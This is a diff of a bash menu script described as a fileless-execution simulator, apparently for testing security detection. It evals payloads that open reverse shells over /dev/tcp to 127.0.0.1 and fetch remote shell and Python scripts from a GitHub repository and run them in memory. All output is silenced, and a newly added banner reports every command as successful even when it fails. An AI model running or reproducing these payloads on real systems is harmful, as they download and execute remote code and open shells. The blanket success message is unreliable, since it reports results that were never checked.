@@ -1,27 +1,28 @@
 #!/usr/bin/env bash
 #
-# fileless-menu.sh  –  Upwind fileless-execution simulator (auto-netcat, silent)
-# ---------------------------------------------------------------------------
+# fileless-menu.sh – Upwind fileless-execution simulator (silent + status)
+# -----------------------------------------------------------------------
 # 1  Encoding       – runs all encoding payloads
 # 2  Downloaders    – runs all downloader payloads
-# 3  ReverseShells  – fires five loopback reverse shells (127.0.0.1, 4441-4443)
-# 4  AdvancedFD     – advanced file-descriptor tricks
+# 3  ReverseShells  – five loopback shells to 127.0.0.1 on ports 4441-4443
+# 4  AdvancedFD     – advanced FD tricks
 # 5  ALL PAYLOADS   – everything in one go
 # q  Quit
-# ---------------------------------------------------------------------------
+# -----------------------------------------------------------------------
 
-set -u  # nounset only; we ignore command errors intentionally
+set -u                             # ignore individual command failures
 
-# ── Minimal colour helpers ─────────────────────────────────────────────────
-RESET=$'\e[0m'; DIM=$'\e[2m'; MAG=$'\e[1;35m'
+# ── Colour helpers ─────────────────────────────────────────────
+RESET=$'\e[0m'; DIM=$'\e[2m'
+MAG=$'\e[1;35m'; GRN=$'\e[1;32m'
 
-# ── Hard-coded reverse-shell params ───────────────────────────────────────
+# ── Fixed reverse-shell params ────────────────────────────────
 LHOST=127.0.0.1
 LPORT1=4441
 LPORT2=4442
 LPORT3=4443
 
-# ── Payload library (fixed numbering + working rot13/base64) ──────────────
+# ── Payloads (numbering fixed) ────────────────────────────────
 declare -A categories
 
 categories[Encoding]='
@@ -70,32 +71,33 @@ exec {FD}<>/dev/tcp/${LHOST}/9898; echo whoami >&$FD; cat <&$FD &
 exec 9< <(dd if=/dev/zero bs=0 count=0 | curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/shell.sh); bash /proc/self/fd/9
 # 18
 python3 - <<'PY'
-import urllib.request, sys, os
+import urllib.request, sys
 exec(urllib.request.urlopen("https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/test.py").read().decode())
 PY
 '
 
-# ── Silent executor ───────────────────────────────────────────────────────
-run_block() {                   # arg = payload block
+# ── Silent executor with success banner ──────────────────────
+run_block() {             # $1 = payload block
   local line num
   while IFS= read -r line; do
     [[ $line =~ ^#\  ]] && num="${line//[!0-9]/}" && continue
     [[ $line ]] || continue
-    printf "%b▶  #%s  %b\n" "$DIM" "$num" "$RESET"
-    eval "$line" >/dev/null 2>&1 || true      # mute & ignore failures
+    printf "%b▶  #%s  running…%b" "$DIM" "$num" "$RESET"
+    eval "$line" >/dev/null 2>&1 || true
+    printf "\r%b✔  command #%s executed successfully%b\n" "$GRN" "$num" "$RESET"
   done <<< "$1"
 }
 
 execute_category() { run_block "${categories[$1]}"; }
 
 execute_all() {
-  for c in Encoding Downloaders ReverseShells AdvancedFD; do
-    printf "\n=== %s ===\n" "$c"
-    execute_category "$c"
+  for cat in Encoding Downloaders ReverseShells AdvancedFD; do
+    printf "\n=== %s ===\n" "$cat"
+    execute_category "$cat"
   done
 }
 
-# ── Tiny banner + menu ────────────────────────────────────────────────────
+# ── Tiny banner + menu ───────────────────────────────────────
 banner() {
   clear
   if command -v figlet >/dev/null; then
@@ -118,7 +120,7 @@ menu() {
   echo
 }
 
-# ── Main loop ─────────────────────────────────────────────────
+# ── Main loop ────────────────────────────────────────────────
 while true; do
   banner; menu
   read -rp "Option: " opt || exit
@@ -131,6 +133,6 @@ while true; do
     [Qq]) exit 0;;
     *)   echo "Invalid option"; sleep 1;;
   esac
-  echo -e "\n${DIM}✓ Done – press Enter for menu…${RESET}"
+  echo -e "\n${DIM}✓ All selected commands finished – press Enter…${RESET}"
   read -r
 done
